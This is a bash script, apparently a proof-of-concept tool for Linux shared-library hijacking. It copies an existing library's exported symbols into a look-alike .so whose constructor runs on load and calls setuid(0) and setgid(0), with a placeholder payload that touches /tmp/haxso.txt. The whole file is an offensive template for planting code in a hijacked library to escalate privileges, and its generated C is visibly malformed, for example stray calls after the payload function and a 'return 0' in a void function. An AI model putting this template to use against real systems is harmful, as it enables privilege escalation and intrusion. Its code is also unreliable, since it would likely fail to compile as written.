#!/bin/bash

if [ "$#" -lt 2 ]; then
    echo "Usage: $0 <input_shared_library.so> <output_shared_library.so> [<source_file.c>]"
    exit 1
fi

INPUT_LIB=$1
OUTPUT_LIB=$2
HEADER="mylib.h"
VERSION_SCRIPT_BASE="mylib"
TMP_FILE="symbols.txt"
SOURCE="mylib.c"

# If a source file is provided as an argument, use it
if [ "$#" -eq 3 ]; then
    SOURCE=$3
else
    # Otherwise, create the source file with the given C code
    echo "#include <stdio.h>" > $SOURCE
    echo "#include <stdlib.h>" >> $SOURCE
    echo "#include <unistd.h>" >> $SOURCE
    echo "static void runmahpayload() __attribute__((constructor));" >> $SOURCE
    # Add function declarations extracted from readelf
    readelf -s --wide $INPUT_LIB | grep FUNC | grep -v '@GLIB' | awk '{print $8}' | sed 's/@@.*//' | awk '{print "    int",$1";"}' >> $SOURCE
    echo "void runmahpayload() {" >> $SOURCE
    echo "    setuid(0);" >> $SOURCE
    echo "    setgid(0);" >> $SOURCE
    echo "    printf(\"DLL HIJACKING IN PROGRESS \\n\");" >> $SOURCE
    echo "    system(\"touch /tmp/haxso.txt\");" >> $SOURCE
   echo "}" >> $SOURCE
fi

# Extract function symbols from the shared library
readelf -s --wide $INPUT_LIB | grep FUNC | grep -v '@GLIB' > $TMP_FILE

# Generate header file
echo "Generating header file..."
echo "#ifndef MYLIB_H" > $HEADER
echo "#define MYLIB_H" >> $HEADER

# Process each line from the readelf output
while IFS= read -r line; do
    # Extract the symbol name and potential version information
    symbol=$(echo $line | awk '{print $8}')
    version=$(echo $symbol | grep -o '@.*')

    # Check if the symbol has version information
    if [[ -n $version ]]; then
        # Strip the '@' and use the version information to determine the map file
        base_symbol=$(echo $symbol | sed 's/@.*//')
        version_name=$(echo $version | sed 's/@//' | sed 's/@//')
        map_file="${version_name}.map"

        # Append the symbol to the appropriate map file
        echo "Adding $base_symbol to $map_file..."
        if [ ! -f $map_file ]; then
            echo "${version_name} {" > $map_file
            echo "    global:" >> $map_file
            echo "        $base_symbol;" >> $map_file
            echo "    local:" >> $map_file
            echo "        *;" >> $map_file
            echo "};" >> $map_file
        else
            sed -i "/global:/a\\        $base_symbol;" $map_file
        fi
    else
        # Append the symbol to the header file
        echo "void $symbol();" >> $HEADER
        echo "    $symbol();" >> $SOURCE
    fi
done < $TMP_FILE

# Finalize the header file
echo "#endif // MYLIB_H" >> $HEADER

# Finalize the source file if we created it
if [ "$#" -ne 3 ]; then
    echo "    return 0;" >> $SOURCE
    echo "}" >> $SOURCE
fi

# Clean up
rm $TMP_FILE

echo "Header file generated: $HEADER"
echo "Version scripts generated: $(ls *.map)"

# Compile the shared library
echo "Compiling the shared library..."
compile_commands="gcc -fPIC -c $SOURCE -o mylib.o"
eval $compile_commands

# Create the shared library
map_files=$(ls *.map 2>/dev/null)
if [[ -n $map_files ]]; then
    echo "Linking with version scripts: $map_files"
    link_commands="gcc -shared -Wl,$(for map in $map_files; do echo -n "--version-script=$map,"; done | sed 's/,$//') -o $OUTPUT_LIB mylib.o"
    eval $link_commands
else
    link_commands="gcc -shared -o $OUTPUT_LIB mylib.o"
    eval $link_commands
fi

# Clean up object file
rm mylib.o

echo "Shared library created: $OUTPUT_LIB"

# Print out the commands used to compile the new shared object library
echo -e "# Compile the shared library\n$compile_commands\n$link_commands" > recompile.sh
